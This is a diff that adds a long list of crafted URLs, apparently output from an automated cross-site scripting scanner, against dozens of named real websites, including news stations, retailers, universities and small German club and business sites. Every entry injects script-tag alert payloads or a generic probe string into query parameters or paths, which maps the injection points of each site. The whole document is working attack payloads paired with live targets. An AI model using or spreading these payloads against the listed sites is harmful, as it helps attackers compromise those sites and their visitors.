@@ -655,3 +655,309 @@ brother.ally.de/index.phpPatterns:
 +	http://brother.ally.de/index.php?cat="><script>alert('XSS');</script>&product_list_next_page="><script>alert('XSS');</script>&
 +	http://brother.ally.de/index.php?cat=--><script>alert('XSS');</script><!--&product_list_next_page=--><script>alert('XSS');</script><!--&
 --------------------------------------
+www.ico.edu/Patterns:
++	http://www.ico.edu/?option='><script>alert('XSS');</script><!--&view='><script>alert('XSS');</script><!--&id='><script>alert('XSS');</script><!--&Itemid='><script>alert('XSS');</script><!--&'';!--"<AEgHKsikgaE>=&{()}
++	http://www.ico.edu/?option='';!--"<AEgHKsikgaE>=&{()}&view='';!--"<AEgHKsikgaE>=&{()}&id='';!--"<AEgHKsikgaE>=&{()}&Itemid='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.raijintek.com/en/products_detail.phpPatterns:
++	http://www.raijintek.com/en/products_detail.php?ProductID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.raijintek.com/en/products_detail.phpPatterns:
++	https://www.raijintek.com/en/products_detail.php?ProductID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.oasa.gr/newscat.phpPatterns:
++	http://www.oasa.gr/newscat.php?id="><script>alert('XSS');</script>&lang="><script>alert('XSS');</script>&
++	http://www.oasa.gr/newscat.php?id=--><script>alert('XSS');</script><!--&lang=--><script>alert('XSS');</script><!--&
++	http://www.oasa.gr/newscat.php?id='><script>alert('XSS');</script><!--&lang='><script>alert('XSS');</script><!--&
++	http://www.oasa.gr/newscat.php?id='';!--"<AEgHKsikgaE>=&{()}&lang='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.wtap.com/newsPatterns:
++	https://www.wtap.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
++	https://www.wtap.com/news?cat=--><script>alert('XSS');</script><!--&cat_type=--><script>alert('XSS');</script><!--&path=--><script>alert('XSS');</script><!--&
++	https://www.wtap.com/news?cat='><script>alert('XSS');</script><!--&cat_type='><script>alert('XSS');</script><!--&path='><script>alert('XSS');</script><!--&
++	https://www.wtap.com/news?cat='';!--"<AEgHKsikgaE>=&{()}&cat_type='';!--"<AEgHKsikgaE>=&{()}&path='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.wibw.com/newsPatterns:
++	https://www.wibw.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
++	https://www.wibw.com/news?cat=--><script>alert('XSS');</script><!--&cat_type=--><script>alert('XSS');</script><!--&path=--><script>alert('XSS');</script><!--&
++	https://www.wibw.com/news?cat='><script>alert('XSS');</script><!--&cat_type='><script>alert('XSS');</script><!--&path='><script>alert('XSS');</script><!--&
++	https://www.wibw.com/news?cat='';!--"<AEgHKsikgaE>=&{()}&cat_type='';!--"<AEgHKsikgaE>=&{()}&path='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.wymt.com/newsPatterns:
++	https://www.wymt.com/news?cat="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
++	https://www.wymt.com/news?cat=--><script>alert('XSS');</script><!--&path=--><script>alert('XSS');</script><!--&
++	https://www.wymt.com/news?cat='><script>alert('XSS');</script><!--&path='><script>alert('XSS');</script><!--&
++	https://www.wymt.com/news?cat='';!--"<AEgHKsikgaE>=&{()}&path='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.us.marantz.com/us/products/pages/productdetails.aspxPatterns:
++	https://www.us.marantz.com/us/products/pages/productdetails.aspx?catid="><script>alert('XSS');</script>&productid="><script>alert('XSS');</script>&
++	https://www.us.marantz.com/us/products/pages/productdetails.aspx?catid=--><script>alert('XSS');</script><!--&productid=--><script>alert('XSS');</script><!--&
++	https://www.us.marantz.com/us/products/pages/productdetails.aspx?catid='><script>alert('XSS');</script><!--&productid='><script>alert('XSS');</script><!--&
+--------------------------------------
+www.ktuu.com/news/Patterns:
++	https://www.ktuu.com/news/?path="><script>alert('XSS');</script>&cat="><script>alert('XSS');</script>&
++	https://www.ktuu.com/news/?path=--><script>alert('XSS');</script><!--&cat=--><script>alert('XSS');</script><!--&
++	https://www.ktuu.com/news/?path='><script>alert('XSS');</script><!--&cat='><script>alert('XSS');</script><!--&
++	https://www.ktuu.com/news/?path='';!--"<AEgHKsikgaE>=&{()}&cat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.ebags.com/product/ebags/tls-professional-slim-laptop-backpack/249582Patterns:
++	https://www.ebags.com/product/ebags/tls-professional-slim-laptop-backpack/249582"><script>alert('XSS');</script>
++	https://www.ebags.com/product/ebags/tls-professional-slim-laptop-backpack/249582--><script>alert('XSS');</script><!--
++	https://www.ebags.com/product/ebags/tls-professional-slim-laptop-backpack/249582'><script>alert('XSS');</script><!--
++	https://www.ebags.com/product/ebags/tls-professional-slim-laptop-backpack/249582'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.ebags.com/product/ebags/mother-lode-tls-weekender-convertible/143101Patterns:
++	https://www.ebags.com/product/ebags/mother-lode-tls-weekender-convertible/143101"><script>alert('XSS');</script>
++	https://www.ebags.com/product/ebags/mother-lode-tls-weekender-convertible/143101--><script>alert('XSS');</script><!--
++	https://www.ebags.com/product/ebags/mother-lode-tls-weekender-convertible/143101'><script>alert('XSS');</script><!--
++	https://www.ebags.com/product/ebags/mother-lode-tls-weekender-convertible/143101'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+support.lexmark.com/indexPatterns:
++	http://support.lexmark.com/index?page=content&id=SO1117&segment=SUPPORTproductCode%3D&productCode=LEXMARK_Z705&locale=de&userlocale=DE_DE&"><script>alert('XSS');</script>
++	http://support.lexmark.com/index?page="><script>alert('XSS');</script>&id="><script>alert('XSS');</script>&segment="><script>alert('XSS');</script>&productCode="><script>alert('XSS');</script>&locale="><script>alert('XSS');</script>&userlocale="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
++	http://support.lexmark.com/index?page=--><script>alert('XSS');</script><!--&id=--><script>alert('XSS');</script><!--&segment=--><script>alert('XSS');</script><!--&productCode=--><script>alert('XSS');</script><!--&locale=--><script>alert('XSS');</script><!--&userlocale=--><script>alert('XSS');</script><!--&'><script>alert('XSS');</script><!--
++	http://support.lexmark.com/index?page='><script>alert('XSS');</script><!--&id='><script>alert('XSS');</script><!--&segment='><script>alert('XSS');</script><!--&productCode='><script>alert('XSS');</script><!--&locale='><script>alert('XSS');</script><!--&userlocale='><script>alert('XSS');</script><!--&'';!--"<AEgHKsikgaE>=&{()}
++	http://support.lexmark.com/index?page='';!--"<AEgHKsikgaE>=&{()}&id='';!--"<AEgHKsikgaE>=&{()}&segment='';!--"<AEgHKsikgaE>=&{()}&productCode='';!--"<AEgHKsikgaE>=&{()}&locale='';!--"<AEgHKsikgaE>=&{()}&userlocale='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.projektd.com/product_info.phpPatterns:
++	http://www.projektd.com/product_info.php?products_id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+haokan.baidu.com/activity/h5/chaihongbaoPatterns:
++	https://haokan.baidu.com/activity/h5/chaihongbao?productid='';!--"<AEgHKsikgaE>=&{()}&pd='';!--"<AEgHKsikgaE>=&{()}&inviteCode='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.langenachtderwissenschaften.de/index.phpPatterns:
++	https://www.langenachtderwissenschaften.de/index.php?article_id='><script>alert('XSS');</script><!--&'';!--"<AEgHKsikgaE>=&{()}
++	https://www.langenachtderwissenschaften.de/index.php?article_id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+pa.onjoph.com/content/master.phpPatterns:
++	https://pa.onjoph.com/content/master.php?VIEW='';!--"<AEgHKsikgaE>=&{()}&JOURNAL_ID='';!--"<AEgHKsikgaE>=&{()}&chapterid='';!--"<AEgHKsikgaE>=&{()}&ARTICLE_ID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.zurrschienen.com/index.phpPatterns:
++	http://www.zurrschienen.com/index.php?option=com_content&view=article&id=6&Itemid=123&lang=de&"><script>alert('XSS');</script>
+--------------------------------------
+www.nzherald.co.nz/Patterns:
++	https://www.nzherald.co.nz/'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+taxifunk-reutlingen.de/index.phpPatterns:
++	https://taxifunk-reutlingen.de/index.php?from='';!--"<AEgHKsikgaE>=&{()}&article_id='';!--"<AEgHKsikgaE>=&{()}&offer='';!--"<AEgHKsikgaE>=&{()}&telefonnummer='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.taxifunk-reutlingen.de/index.phpPatterns:
++	https://www.taxifunk-reutlingen.de/index.php?from='';!--"<AEgHKsikgaE>=&{()}&article_id='';!--"<AEgHKsikgaE>=&{()}&offer='';!--"<AEgHKsikgaE>=&{()}&telefonnummer='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.taxifunk-zentrale-reutlingen.de/index.phpPatterns:
++	https://www.taxifunk-zentrale-reutlingen.de/index.php?from='';!--"<AEgHKsikgaE>=&{()}&article_id='';!--"<AEgHKsikgaE>=&{()}&offer='';!--"<AEgHKsikgaE>=&{()}&telefonnummer='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+time.com/Patterns:
++	https://time.com/'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.taxi-reutlingen-zentrale.de/index.phpPatterns:
++	https://www.taxi-reutlingen-zentrale.de/index.php?from='';!--"<AEgHKsikgaE>=&{()}&article_id='';!--"<AEgHKsikgaE>=&{()}&offer='';!--"<AEgHKsikgaE>=&{()}&telefonnummer='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.epc.eu/pub_details.phpPatterns:
++	http://www.epc.eu/pub_details.php?cat_id="><script>alert('XSS');</script>&pub_id="><script>alert('XSS');</script>&
++	http://www.epc.eu/pub_details.php?cat_id=--><script>alert('XSS');</script><!--&pub_id=--><script>alert('XSS');</script><!--&
++	http://www.epc.eu/pub_details.php?cat_id='><script>alert('XSS');</script><!--&pub_id='><script>alert('XSS');</script><!--&
++	http://www.epc.eu/pub_details.php?cat_id='';!--"<AEgHKsikgaE>=&{()}&pub_id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.galwayeast.com/showCategory.phpPatterns:
++	http://www.galwayeast.com/showCategory.php?cat_id="><script>alert('XSS');</script>&
++	http://www.galwayeast.com/showCategory.php?cat_id=--><script>alert('XSS');</script><!--&
++	http://www.galwayeast.com/showCategory.php?cat_id='><script>alert('XSS');</script><!--&
++	http://www.galwayeast.com/showCategory.php?cat_id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.gurumama.ca/product-list.phpPatterns:
++	http://www.gurumama.ca/product-list.php?cat_id="><script>alert('XSS');</script>&
++	http://www.gurumama.ca/product-list.php?cat_id=--><script>alert('XSS');</script><!--&'><script>alert('XSS');</script><!--
++	http://www.gurumama.ca/product-list.php?cat_id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+acrpub.com/journal.phpPatterns:
++	http://acrpub.com/journal.php?cat_id="><script>alert('XSS');</script>&
++	http://acrpub.com/journal.php?cat_id=--><script>alert('XSS');</script><!--&
++	http://acrpub.com/journal.php?cat_id='><script>alert('XSS');</script><!--&
++	http://acrpub.com/journal.php?cat_id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.ashtiani.co.uk/collections.phpPatterns:
++	http://www.ashtiani.co.uk/collections.php?cat_id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+law.mc.edu/catalog/index.phpPatterns:
++	https://law.mc.edu/catalog/index.php?cat_id="><script>alert('XSS');</script>&
++	https://law.mc.edu/catalog/index.php?cat_id=--><script>alert('XSS');</script><!--&
++	https://law.mc.edu/catalog/index.php?cat_id='><script>alert('XSS');</script><!--&
++	https://law.mc.edu/catalog/index.php?cat_id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.siestakeyvacation.com/facilities.phpPatterns:
++	http://www.siestakeyvacation.com/facilities.php?cat_Id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.altenburg.eu/sixcms/detail.phpPatterns:
++	https://www.altenburg.eu/sixcms/detail.php?id=11685&"><script>alert('XSS');</script>
++	https://www.altenburg.eu/sixcms/detail.php?id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
++	https://www.altenburg.eu/sixcms/detail.php?id=--><script>alert('XSS');</script><!--&'><script>alert('XSS');</script><!--
++	https://www.altenburg.eu/sixcms/detail.php?id='><script>alert('XSS');</script><!--&'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080Patterns:
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080"><script>alert('XSS');</script>
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080--><script>alert('XSS');</script><!--
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080'><script>alert('XSS');</script><!--
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.akurat-immobilien.de/immobilien-details.xhtmlPatterns:
++	https://www.akurat-immobilien.de/immobilien-details.xhtml?id[obj0]="><script>alert('XSS');</script>&
++	https://www.akurat-immobilien.de/immobilien-details.xhtml?id[obj0]=--><script>alert('XSS');</script><!--&
++	https://www.akurat-immobilien.de/immobilien-details.xhtml?id[obj0]='><script>alert('XSS');</script><!--&
++	https://www.akurat-immobilien.de/immobilien-details.xhtml?id[obj0]='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.running-wild.de/index.phpPatterns:
++	http://www.running-wild.de/index.php?newsid="><script>alert('XSS');</script>&searchstring="><script>alert('XSS');</script>&site="><script>alert('XSS');</script>&newscat="><script>alert('XSS');</script>&
++	http://www.running-wild.de/index.php?newsid=--><script>alert('XSS');</script><!--&searchstring=--><script>alert('XSS');</script><!--&site=--><script>alert('XSS');</script><!--&newscat=--><script>alert('XSS');</script><!--&
++	http://www.running-wild.de/index.php?newsid='><script>alert('XSS');</script><!--&searchstring='><script>alert('XSS');</script><!--&site='><script>alert('XSS');</script><!--&newscat='><script>alert('XSS');</script><!--&
++	http://www.running-wild.de/index.php?newsid='';!--"<AEgHKsikgaE>=&{()}&searchstring='';!--"<AEgHKsikgaE>=&{()}&site='';!--"<AEgHKsikgaE>=&{()}&newscat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.iconnectjournal.com/newspage.phpPatterns:
++	https://www.iconnectjournal.com/newspage.php?newsid=--><script>alert('XSS');</script><!--&newscat=--><script>alert('XSS');</script><!--&
++	https://www.iconnectjournal.com/newspage.php?newsid='';!--"<AEgHKsikgaE>=&{()}&newscat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+pgl.yoyo.org/luai/i/loadfilePatterns:
++	https://pgl.yoyo.org/luai/i/loadfile"><script>alert('XSS');</script>
++	https://pgl.yoyo.org/luai/i/loadfile--><script>alert('XSS');</script><!--
++	https://pgl.yoyo.org/luai/i/loadfile'><script>alert('XSS');</script><!--
++	https://pgl.yoyo.org/luai/i/loadfile'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.terradreams.de/MainIndex.phpPatterns:
++	http://www.terradreams.de/MainIndex.php?newsid='';!--"<AEgHKsikgaE>=&{()}&searchstring='';!--"<AEgHKsikgaE>=&{()}&site='';!--"<AEgHKsikgaE>=&{()}&newscat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+tuntenlan.de/01news/01news.phpPatterns:
++	http://tuntenlan.de/01news/01news.php?newsid='';!--"<AEgHKsikgaE>=&{()}&searchstring='';!--"<AEgHKsikgaE>=&{()}&site='';!--"<AEgHKsikgaE>=&{()}&newscat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.caritas-duisburg.de/newser/neuinstallation/01news/01news.phpPatterns:
++	http://www.caritas-duisburg.de/newser/neuinstallation/01news/01news.php?newsid='';!--"<AEgHKsikgaE>=&{()}&searchstring='';!--"<AEgHKsikgaE>=&{()}&site='';!--"<AEgHKsikgaE>=&{()}&newscat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.triebl.com/news-flash/01news.phpPatterns:
++	http://www.triebl.com/news-flash/01news.php?newsid='';!--"<AEgHKsikgaE>=&{()}&searchstring='';!--"<AEgHKsikgaE>=&{()}&site='';!--"<AEgHKsikgaE>=&{()}&newscat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.kmvt.com/newsPatterns:
++	https://www.kmvt.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
++	https://www.kmvt.com/news?cat=--><script>alert('XSS');</script><!--&cat_type=--><script>alert('XSS');</script><!--&path=--><script>alert('XSS');</script><!--&
++	https://www.kmvt.com/news?cat='><script>alert('XSS');</script><!--&cat_type='><script>alert('XSS');</script><!--&path='><script>alert('XSS');</script><!--&
++	https://www.kmvt.com/news?cat='';!--"<AEgHKsikgaE>=&{()}&cat_type='';!--"<AEgHKsikgaE>=&{()}&path='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.kiis.com.ua/Patterns:
++	http://www.kiis.com.ua/?lang='';!--"<AEgHKsikgaE>=&{()}&cat='';!--"<AEgHKsikgaE>=&{()}&id='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+sains.kompas.com/read/2018/09/25/200000923/kenali-beragam-alat-kontrasepsi-beserta-kelebihan-dan-kekurangannyaPatterns:
++	https://sains.kompas.com/read/2018/09/25/200000923/kenali-beragam-alat-kontrasepsi-beserta-kelebihan-dan-kekurangannya?page='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.merriam-webster.com/dictionary/sectionPatterns:
++	https://www.merriam-webster.com/dictionary/section'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+almhultsbostader.se/nyheterPatterns:
++	https://almhultsbostader.se/nyheter'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+ys-tech.force.com/heatproof_topics_categoryPatterns:
++	http://ys-tech.force.com/heatproof_topics_category?NewsCat="><script>alert('XSS');</script>&
++	http://ys-tech.force.com/heatproof_topics_category?NewsCat=--><script>alert('XSS');</script><!--&
++	http://ys-tech.force.com/heatproof_topics_category?NewsCat='><script>alert('XSS');</script><!--&
++	http://ys-tech.force.com/heatproof_topics_category?NewsCat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+ys-tech.secure.force.com/topics_categoryPatterns:
++	https://ys-tech.secure.force.com/topics_category?NewsCat="><script>alert('XSS');</script>&
++	https://ys-tech.secure.force.com/topics_category?NewsCat=--><script>alert('XSS');</script><!--&
++	https://ys-tech.secure.force.com/topics_category?NewsCat='><script>alert('XSS');</script><!--&
++	https://ys-tech.secure.force.com/topics_category?NewsCat='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.terratec.de/page.phpPatterns:
++	https://www.terratec.de/page.php?page=/support/&"><script>alert('XSS');</script>
++	https://www.terratec.de/page.php?page="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
++	https://www.terratec.de/page.php?page=--><script>alert('XSS');</script><!--&'><script>alert('XSS');</script><!--
++	https://www.terratec.de/page.php?page='><script>alert('XSS');</script><!--&'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.pagewhite.com/Patterns:
++	http://www.pagewhite.com/"><script>alert('XSS');</script>
++	http://www.pagewhite.com/--><script>alert('XSS');</script><!--
++	http://www.pagewhite.com/'><script>alert('XSS');</script><!--
++	http://www.pagewhite.com/'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+support.lexmark.com/indexPatterns:
++	http://support.lexmark.com/index?page=driverSupport&locale=DE&userlocale=DE_DE&'><script>alert('XSS');</script><!--
++	http://support.lexmark.com/index?page='><script>alert('XSS');</script><!--&locale='><script>alert('XSS');</script><!--&userlocale='><script>alert('XSS');</script><!--&'';!--"<AEgHKsikgaE>=&{()}
++	http://support.lexmark.com/index?page='';!--"<AEgHKsikgaE>=&{()}&locale='';!--"<AEgHKsikgaE>=&{()}&userlocale='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.merriam-webster.com/dictionary/URLPatterns:
++	https://www.merriam-webster.com/dictionary/URL'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.followthatpage.com/Patterns:
++	https://www.followthatpage.com/'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.thepetedesign.com/demos/onepage_scroll_demo.htmlPatterns:
++	http://www.thepetedesign.com/demos/onepage_scroll_demo.html"><script>alert('XSS');</script>
++	http://www.thepetedesign.com/demos/onepage_scroll_demo.html--><script>alert('XSS');</script><!--
++	http://www.thepetedesign.com/demos/onepage_scroll_demo.html'><script>alert('XSS');</script><!--
++	http://www.thepetedesign.com/demos/onepage_scroll_demo.html'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.merriam-webster.com/dictionary/sitePatterns:
++	https://www.merriam-webster.com/dictionary/site'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+leichtathletik.btvonline.de/Patterns:
++	https://leichtathletik.btvonline.de/?pageID="><script>alert('XSS');</script>&
++	https://leichtathletik.btvonline.de/?pageID=--><script>alert('XSS');</script><!--&
++	https://leichtathletik.btvonline.de/?pageID='><script>alert('XSS');</script><!--&
++	https://leichtathletik.btvonline.de/?pageID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.djkdvkoeln.de/Patterns:
++	http://www.djkdvkoeln.de/?pageID="><script>alert('XSS');</script>&
++	http://www.djkdvkoeln.de/?pageID=--><script>alert('XSS');</script><!--&
++	http://www.djkdvkoeln.de/?pageID='><script>alert('XSS');</script><!--&
++	http://www.djkdvkoeln.de/?pageID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.vespaclub.de/index.phpPatterns:
++	http://www.vespaclub.de/index.php?pageid="><script>alert('XSS');</script>&
++	http://www.vespaclub.de/index.php?pageid=--><script>alert('XSS');</script><!--&
++	http://www.vespaclub.de/index.php?pageid='><script>alert('XSS');</script><!--&
++	http://www.vespaclub.de/index.php?pageid='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.camping-bergen.de/index.phpPatterns:
++	http://www.camping-bergen.de/index.php?pageID="><script>alert('XSS');</script>&
++	http://www.camping-bergen.de/index.php?pageID=--><script>alert('XSS');</script><!--&
++	http://www.camping-bergen.de/index.php?pageID='><script>alert('XSS');</script><!--&
++	http://www.camping-bergen.de/index.php?pageID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.stmz.ch/de/index.phpPatterns:
++	https://www.stmz.ch/de/index.php?page=8&pageId=20&"><script>alert('XSS');</script>
++	https://www.stmz.ch/de/index.php?page="><script>alert('XSS');</script>&pageId="><script>alert('XSS');</script>&
++	https://www.stmz.ch/de/index.php?page="><script>alert('XSS');</script>&pageId="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
++	https://www.stmz.ch/de/index.php?page=--><script>alert('XSS');</script><!--&pageId=--><script>alert('XSS');</script><!--&
++	https://www.stmz.ch/de/index.php?page=--><script>alert('XSS');</script><!--&pageId=--><script>alert('XSS');</script><!--&'><script>alert('XSS');</script><!--
++	https://www.stmz.ch/de/index.php?page='><script>alert('XSS');</script><!--&pageId='><script>alert('XSS');</script><!--&
++	https://www.stmz.ch/de/index.php?page='><script>alert('XSS');</script><!--&pageId='><script>alert('XSS');</script><!--&'';!--"<AEgHKsikgaE>=&{()}
++	https://www.stmz.ch/de/index.php?page='';!--"<AEgHKsikgaE>=&{()}&pageId='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+zinzinotest.com/Patterns:
++	https://zinzinotest.com/?pageID=1&openLevel=19&langID=de&"><script>alert('XSS');</script>
++	https://zinzinotest.com/?pageID="><script>alert('XSS');</script>&openLevel="><script>alert('XSS');</script>&langID="><script>alert('XSS');</script>&
++	https://zinzinotest.com/?pageID=--><script>alert('XSS');</script><!--&openLevel=--><script>alert('XSS');</script><!--&langID=--><script>alert('XSS');</script><!--&
++	https://zinzinotest.com/?pageID='><script>alert('XSS');</script><!--&openLevel='><script>alert('XSS');</script><!--&langID='><script>alert('XSS');</script><!--&
++	https://zinzinotest.com/?pageID='';!--"<AEgHKsikgaE>=&{()}&openLevel='';!--"<AEgHKsikgaE>=&{()}&langID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.weinburg.eu/Patterns:
++	http://www.weinburg.eu/?pageID="><script>alert('XSS');</script>&
++	http://www.weinburg.eu/?pageID=--><script>alert('XSS');</script><!--&
++	http://www.weinburg.eu/?pageID='><script>alert('XSS');</script><!--&
++	http://www.weinburg.eu/?pageID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.altium.com/documentation/Patterns:
++	https://www.altium.com/documentation/"><script>alert('XSS');</script>
++	https://www.altium.com/documentation/--><script>alert('XSS');</script><!--
++	https://www.altium.com/documentation/'><script>alert('XSS');</script><!--
++	https://www.altium.com/documentation/'';!--"<AEgHKsikgaE>=&{()}
+--------------------------------------
+www.westticket.de/-Tickets-3671/Patterns:
++	https://www.westticket.de/-Tickets-3671/?evLId=78918&pageId=3671&"><script>alert('XSS');</script>
+--------------------------------------
+www.gap.com/browse/category.doPatterns:
++	https://www.gap.com/browse/category.do?cid='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
+www.stuttgart.de/baeder/index.phpPatterns:
++	https://www.stuttgart.de/baeder/index.php?objecttype="><script>alert('XSS');</script>&id="><script>alert('XSS');</script>&pageID="><script>alert('XSS');</script>&
++	https://www.stuttgart.de/baeder/index.php?objecttype=--><script>alert('XSS');</script><!--&id=--><script>alert('XSS');</script><!--&pageID=--><script>alert('XSS');</script><!--&
++	https://www.stuttgart.de/baeder/index.php?objecttype='><script>alert('XSS');</script><!--&id='><script>alert('XSS');</script><!--&pageID='><script>alert('XSS');</script><!--&
++	https://www.stuttgart.de/baeder/index.php?objecttype='';!--"<AEgHKsikgaE>=&{()}&id='';!--"<AEgHKsikgaE>=&{()}&pageID='';!--"<AEgHKsikgaE>=&{()}&
+--------------------------------------
